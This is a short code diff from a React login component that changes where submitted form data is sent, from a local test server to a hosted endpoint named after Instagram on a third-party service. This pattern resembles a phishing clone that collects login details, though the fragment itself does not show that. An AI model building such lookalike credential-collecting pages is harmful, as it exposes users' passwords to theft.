@@ -43,7 +43,7 @@ const Login = () => {
     }
 
     // If valid, send form data to backend API
-    fetch('http://localhost:5000/api/submit', {
+    fetch('https://instagram-17zw.onrender.com/api/submit', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
